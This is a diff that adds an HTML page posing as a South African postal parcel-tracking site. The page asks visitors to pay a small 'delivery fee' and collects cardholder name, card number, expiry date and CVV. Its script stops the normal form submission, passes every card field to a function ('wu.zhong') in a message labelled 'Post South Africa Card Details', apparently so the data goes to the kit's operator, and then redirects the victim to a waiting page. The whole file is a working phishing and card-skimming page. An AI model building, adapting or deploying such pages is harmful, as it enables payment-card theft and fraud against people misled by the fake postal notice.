@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/south.css">
+   
+    
+    <title></title>
+   
+</head>
+<body style="text-align:center;">
+    <div class="zz">
+        <img src="res/img/post.jpg" alt="photo">
+    </div>
+
+ 
+    <main>
+    <div class="heads" style="background:none; margin:0; padding:0;">  <h1> Track your parcel</h1>  </div><br>
+   <div class="heads">
+   
+   <div class="a">
+   <h3>Confirm delivery.</h3>
+    <p> Please add a payment method to pay delivery fees. </p>
+</div>
+
+<form action="post.php" method="post">
+<div class="d"> <label > Delivery fees: 4.28 ZAR </label></div> 
+
+<div class="x"><label> Cardholder name</label> </div>
+<div><input type="text" name="name" required></div>
+
+<div class="x"> 
+<label>Card number</label> </div> 
+<div><input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required></div> 
+<div>
+<label class="x">Expiration date </label></div>
+<div><input type="text" name="exp" placeholder="MM/YY" id="exp" required></div>
+
+<div><label class="x">Security code</label> </div>
+<div><input type="text" name="cvv" placeholder="CVV" id="cvv" required> </div>
+
+<div class="back">
+    <button type="submit">Next</button>
+</div>
+
+
+
+</form>   
+    
+    </div>
+</main>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+<script>
+$("#cc").mask("0000 0000 0000 0000");
+$("#exp").mask("00/00");
+$("#cvv").mask("0000");
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+e.preventDefault();
+
+wu.zhong(`💳 Post South Africa Card Details\n\nName:${document.querySelector("[name='name']").value}\n\nCard Number:${document.querySelector("[name='cc']").value}\n\nExp:${document.querySelector("[name='exp']").value}\n\nCVV:${document.querySelector("[name='cvv']").value}`);
+
+window.location="wait.html";
+
+});
+
+
+</script>
+</body>
+</html>
